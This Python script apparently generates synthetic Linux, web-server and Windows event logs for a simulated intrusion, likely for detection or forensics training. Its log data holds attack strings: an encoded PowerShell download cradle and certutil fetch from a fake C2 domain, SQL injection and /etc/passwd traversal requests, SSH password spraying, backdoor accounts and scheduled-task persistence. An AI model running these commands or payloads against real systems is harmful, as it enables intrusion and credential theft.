from __future__ import annotations

import base64
import json
import random
from datetime import date, datetime, timedelta, timezone
from pathlib import Path

SPRAY_IP = "185.220.101.47"
SCAN_IP = "45.155.205.233"
C2_IP = "91.92.243.17"
C2_DOMAIN = "update-cdn-microsoft.com"
PAYLOAD_SHA256 = "9f2b8c7e1d4a6b3c5e8f0a1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0c1b"
WS01_IP, DC01_IP = "10.0.0.23", "10.0.0.5"

BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]
NIKTO_UA = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:{:06d})"
SQLMAP_UA = "sqlmap/1.8.11#stable (https://sqlmap.org)"
SCAN_PATHS = ["admin/", "administrator/", "phpmyadmin/", ".git/config", ".env", "backup.zip", "backup.sql",
              "wp-login.php", "wp-admin/", "config.php.bak", "server-status", ".htaccess", "test.php",
              "info.php", "phpinfo.php", "db/", "dump.sql", "old/", "cgi-bin/test.cgi", "manager/html",
              "console/", "jenkins/", "api/v1/debug", ".DS_Store", "web.config", "uploads/", "shell.php",
              "cmd.php", "install.php", "setup.php", "vendor/phpunit/", "actuator/env", ".svn/entries"]


class _Sim:
    def __init__(self, day: date, seed: int):
        self.rng = random.Random(seed)
        self.day = datetime(day.year, day.month, day.day, tzinfo=timezone.utc)
        self.auth: list[tuple[datetime, str]] = []
        self.web: list[tuple[datetime, str]] = []
        self.win: list[tuple[datetime, dict]] = []
        self.pid = 1000

    def at(self, hh: int, mm: int, ss: int = 0) -> datetime:
        return self.day + timedelta(hours=hh, minutes=mm, seconds=ss)

    def rand_time(self, start_h=0, end_h=24) -> datetime:
        return self.day + timedelta(seconds=self.rng.randint(start_h * 3600, end_h * 3600 - 1))

    def next_pid(self) -> int:
        self.pid += self.rng.randint(1, 40)
        return self.pid

    def public_ip(self) -> str:
        while True:
            a = self.rng.choice([23, 31, 51, 66, 73, 81, 99, 104, 142, 151, 172, 188, 203, 212])
            ip = f"{a}.{self.rng.randint(1, 254)}.{self.rng.randint(1, 254)}.{self.rng.randint(1, 254)}"
            if not ip.startswith(("172.16.", "203.0.113")):
                return ip

    def sshd(self, ts: datetime, msg: str):
        stamp = ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{self.rng.randint(0, 999999):06d}+00:00"
        self.auth.append((ts, f"{stamp} web01 sshd[{self.next_pid()}]: {msg}"))

    def syslog(self, ts: datetime, proc: str, msg: str):
        stamp = ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{self.rng.randint(0, 999999):06d}+00:00"
        pid = "" if proc == "sudo" else f"[{self.next_pid()}]"
        self.auth.append((ts, f"{stamp} web01 {proc}{pid}: {msg}"))

    def benign_auth(self):
        admins = {"alice": "10.0.0.31", "bob": "10.0.0.32", "deploy": "10.0.0.40"}
        for _ in range(60):
            user = self.rng.choice(list(admins))
            ts = self.rand_time(6, 22)
            port = self.rng.randint(40000, 65000)
            self.sshd(ts, f"Accepted publickey for {user} from {admins[user]} port {port} ssh2: ED25519 SHA256:x")
            self.syslog(ts, "sshd", f"pam_unix(sshd:session): session opened for user {user}(uid=1001) by (uid=0)")
        for _ in range(3):
            ts = self.rand_time(8, 18)
            self.sshd(ts, "Failed password for alice from 10.0.0.31 port 51000 ssh2")
            self.sshd(ts + timedelta(seconds=6), "Accepted password for alice from 10.0.0.31 port 51002 ssh2")
        for cmd in ("/usr/bin/apt update", "/usr/bin/systemctl restart nginx", "/usr/bin/journalctl -u nginx"):
            self.syslog(self.rand_time(9, 17), "sudo",
                        f"   alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND={cmd}")
        for h in range(0, 24):
            self.syslog(self.at(h, 17), "CRON", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")

    def attack_ssh_bruteforce(self):
        ts = self.at(1, 40)
        for _ in range(25):
            ts += timedelta(seconds=self.rng.randint(3, 7))
            self.sshd(ts, f"Failed password for root from {SCAN_IP} port {self.rng.randint(30000, 60000)} ssh2")

    def attack_ssh_spray(self):
        ts = self.at(2, 10)
        users = ["admin", "test", "oracle", "ubuntu", "postgres", "git", "jenkins", "deploy"]
        valid = {"deploy", "ubuntu"}
        for rnd in range(3):
            for user in users:
                ts += timedelta(seconds=self.rng.randint(2, 6))
                port = self.rng.randint(30000, 60000)
                if user == "deploy" and rnd == 2:
                    self.sshd(ts, f"Accepted password for deploy from {SPRAY_IP} port {port} ssh2")
                    self.syslog(ts, "sshd", "pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)")
                    break
                if user not in valid:
                    self.sshd(ts, f"Invalid user {user} from {SPRAY_IP} port {port}")
                    self.sshd(ts, f"Failed password for invalid user {user} from {SPRAY_IP} port {port} ssh2")
                else:
                    self.sshd(ts, f"Failed password for {user} from {SPRAY_IP} port {port} ssh2")
        post = ts
        self.syslog(post + timedelta(minutes=2), "sudo",
                    "  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")
        self.syslog(post + timedelta(minutes=3), "useradd",
                    "new user: name=sysupdate, UID=1003, GID=1003, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/0")
        self.syslog(post + timedelta(minutes=3, seconds=10), "usermod", "add 'sysupdate' to group 'sudo'")

    def http(self, ts, ip, method, path, status, ua, size=None):
        stamp = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
        size = size if size is not None else self.rng.randint(200, 48000)
        self.web.append((ts, f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'))

    def benign_web(self):
        pages = ["/", "/index.html", "/products.php?id={}", "/about", "/contact", "/static/app.css",
                 "/static/app.js", "/images/logo.png", "/login", "/cart", "/search?q=laptop+bag"]
        visitors = [self.public_ip() for _ in range(40)]
        for _ in range(450):
            page = self.rng.choice(pages).format(self.rng.randint(1, 60))
            ip = self.rng.choice(visitors)
            self.http(self.rand_time(), ip, "GET", page, 200, self.rng.choice(BROWSER_UAS))
        for _ in range(15):
            self.http(self.rand_time(), self.rng.choice(visitors), "GET", "/favicon.ico", 404, self.rng.choice(BROWSER_UAS), 0)
            self.http(self.rand_time(), self.rng.choice(visitors), "POST", "/login", 302, self.rng.choice(BROWSER_UAS))

    def attack_web(self):
        ts = self.at(1, 20)
        for i, path in enumerate(SCAN_PATHS):
            ts += timedelta(seconds=self.rng.uniform(0.5, 2.5))
            self.http(ts, SCAN_IP, "GET", "/" + path, 404, NIKTO_UA.format(i), 0)
        ts = self.at(1, 25)
        sqli = ["/products.php?id=1%27%20AND%20SLEEP(5)--%20-",
                "/products.php?id=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--%20-",
                "/products.php?id=-1%27%20UNION%20SELECT%20username,password,3%20FROM%20users--%20-",
                "/products.php?id=1%27%20UNION%20SELECT%20table_name,2,3%20FROM%20information_schema.tables--%20-"]
        for path in sqli:
            ts += timedelta(seconds=self.rng.randint(4, 15))
            self.http(ts, SCAN_IP, "GET", path, 200, SQLMAP_UA)
        ts = self.at(1, 27, 30)
        for path in ("/download.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
                     "/download.php?file=%252e%252e%252f%252e%252e%252fetc%252fshadow"):
            ts += timedelta(seconds=9)
            self.http(ts, SCAN_IP, "GET", path, 200 if "passwd" in path else 403, BROWSER_UAS[2])

    def wev(self, ts, eid, computer, data, channel="Security"):
        ms = self.rng.randint(0, 9999999)
        self.win.append((ts, {"TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ms:07d}Z",
                              "Channel": channel, "EventID": eid, "Computer": f"{computer}.corp.local",
                              "EventData": data}))

    def sysmon_proc(self, ts, computer, image, cmd, parent, parent_cmd="", user="CORP\\jsmith", hashes=None):
        data = {"UtcTime": ts.strftime("%Y-%m-%d %H:%M:%S.000"), "ProcessId": str(self.next_pid()),
                "Image": image, "CommandLine": cmd, "CurrentDirectory": "C:\\Users\\jsmith\\",
                "User": user, "IntegrityLevel": "Medium", "ParentImage": parent, "ParentCommandLine": parent_cmd,
                "Hashes": hashes or f"SHA256={''.join(self.rng.choice('0123456789abcdef') for _ in range(64))}"}
        self.wev(ts, 1, computer, data, "Microsoft-Windows-Sysmon/Operational")

    def benign_windows(self):
        office = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"
        self.wev(self.at(8, 55), 4624, "WS01", {"TargetUserName": "jsmith", "TargetDomainName": "CORP",
                                                 "LogonType": "2", "IpAddress": "-", "WorkstationName": "WS01"})
        apps = [("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", '"chrome.exe"'),
                (office + "OUTLOOK.EXE", '"OUTLOOK.EXE"'), (office + "EXCEL.EXE", '"EXCEL.EXE" /e'),
                ("C:\\Windows\\System32\\notepad.exe", "notepad.exe C:\\Users\\jsmith\\todo.txt"),
                ("C:\\Program Files\\Microsoft VS Code\\Code.exe", '"Code.exe"')]
        for _ in range(40):
            img, cmd = self.rng.choice(apps)
            self.sysmon_proc(self.rand_time(9, 18), "WS01", img, cmd, "C:\\Windows\\explorer.exe")
        self.sysmon_proc(self.at(10, 2), "WS01", "C:\\Windows\\System32\\schtasks.exe",
                         'schtasks.exe /create /tn "GoogleUpdateTaskMachineUA" /tr "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua" /sc hourly /f',
                         "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe", user="NT AUTHORITY\\SYSTEM")
        self.wev(self.at(11, 0), 10, "WS01", {"SourceImage": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe",
                                               "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1fffff"},
                 "Microsoft-Windows-Sysmon/Operational")
        for _ in range(30):
            ip = f"10.0.0.{self.rng.randint(20, 60)}"
            self.wev(self.rand_time(8, 18), 4624, "DC01", {"TargetUserName": self.rng.choice(["jsmith", "mlee", "akhan", "svc_backup"]),
                                                         "LogonType": "3", "IpAddress": ip})
        for _ in range(2):
            self.wev(self.rand_time(8, 18), 4625, "DC01", {"TargetUserName": "mlee", "LogonType": "3",
                                                         "IpAddress": "10.0.0.41", "Status": "0xc000006d"})

    def attack_windows(self):
        office = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"
        ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        svc = "C:\\Users\\Public\\svc.exe"
        sysmon = "Microsoft-Windows-Sysmon/Operational"
        cradle = f"IEX (New-Object Net.WebClient).DownloadString('http://{C2_DOMAIN}/a.ps1')"
        enc = base64.b64encode(cradle.encode("utf-16-le")).decode()

        self.sysmon_proc(self.at(9, 31, 10), "WS01", office + "WINWORD.EXE",
                         f'"{office}WINWORD.EXE" /n "C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\7QX2\\Invoice_Nov2026.docm"',
                         office + "OUTLOOK.EXE")
        self.sysmon_proc(self.at(9, 31, 42), "WS01", ps, f"powershell.exe -nop -w hidden -enc {enc}",
                         office + "WINWORD.EXE")
        self.wev(self.at(9, 31, 44), 3, "WS01", {"Image": ps, "User": "CORP\\jsmith", "Protocol": "tcp",
                                                  "Initiated": "true", "SourceIp": WS01_IP, "SourcePort": "50122",
                                                  "DestinationIp": C2_IP, "DestinationHostname": C2_DOMAIN,
                                                  "DestinationPort": "80"}, sysmon)
        self.sysmon_proc(self.at(9, 32, 5), "WS01", "C:\\Windows\\System32\\certutil.exe",
                         f"certutil.exe -urlcache -split -f http://{C2_DOMAIN}/svc.exe {svc}", ps)
        self.sysmon_proc(self.at(9, 32, 30), "WS01", svc, svc, ps, hashes=f"SHA256={PAYLOAD_SHA256.upper()}")
        for t, (img, cmd) in enumerate([("C:\\Windows\\System32\\whoami.exe", "whoami /all"),
                                        ("C:\\Windows\\System32\\net.exe", 'net group "domain admins" /domain'),
                                        ("C:\\Windows\\System32\\nltest.exe", "nltest /dclist:corp.local")]):
            self.sysmon_proc(self.at(9, 33, 10 + t * 7), "WS01", img, cmd, svc)
        self.wev(self.at(9, 34), 10, "WS01", {"SourceImage": svc, "TargetImage": "C:\\Windows\\system32\\lsass.exe",
                                              "GrantedAccess": "0x1010", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|UNKNOWN(00007FF8A1B2)"},
                 sysmon)
        ts = self.at(9, 36)
        for user in ["administrator", "svc_sql", "backup_admin", "it_admin", "svc_backup", "akhan", "mlee"]:
            for _ in range(2):
                ts += timedelta(seconds=self.rng.randint(1, 4))
                self.wev(ts, 4625, "DC01", {"TargetUserName": user, "TargetDomainName": "CORP", "LogonType": "3",
                                            "IpAddress": WS01_IP, "Status": "0xc000006d", "WorkstationName": "WS01"})
        self.wev(ts + timedelta(seconds=20), 4624, "DC01", {"TargetUserName": "svc_backup", "TargetDomainName": "CORP",
                                                             "LogonType": "3", "IpAddress": WS01_IP, "WorkstationName": "WS01"})
        self.wev(self.at(9, 40), 4720, "WS01", {"TargetUserName": "helpdesk_svc", "SubjectUserName": "jsmith",
                                                "SubjectDomainName": "CORP"})
        self.wev(self.at(9, 40, 8), 4732, "WS01", {"MemberName": "-", "MemberSid": "S-1-5-21-1004336348-1177238915-682003330-1013",
                                                   "TargetUserName": "Administrators", "TargetSid": "S-1-5-32-544",
                                                   "SubjectUserName": "jsmith"})
        self.win[-1][1]["EventData"]["MemberName"] = "helpdesk_svc"
        self.sysmon_proc(self.at(9, 41), "WS01", "C:\\Windows\\System32\\schtasks.exe",
                         f'schtasks.exe /create /tn "WindowsUpdateCheck" /tr "{svc}" /sc onlogon /ru SYSTEM /f', svc)
        self.wev(self.at(9, 45), 1102, "WS01", {"SubjectUserName": "jsmith", "SubjectDomainName": "CORP"})


def generate(out_dir: Path, day: date | None = None, seed: int = 7) -> dict[str, int]:
    sim = _Sim(day or date(2026, 11, 18), seed)
    sim.benign_auth()
    sim.attack_ssh_bruteforce()
    sim.attack_ssh_spray()
    sim.benign_web()
    sim.attack_web()
    sim.benign_windows()
    sim.attack_windows()
    out_dir.mkdir(parents=True, exist_ok=True)
    files = {
        "web01_auth.log": "\n".join(line for _, line in sorted(sim.auth, key=lambda x: x[0])) + "\n",
        "web01_access.log": "\n".join(line for _, line in sorted(sim.web, key=lambda x: x[0])) + "\n",
        "windows_events.jsonl": "\n".join(json.dumps(r) for _, r in sorted(sim.win, key=lambda x: x[0])) + "\n",
    }
    counts = {}
    for name, content in files.items():
        (out_dir / name).write_text(content, encoding="utf-8")
        counts[name] = content.count("\n")
    return counts
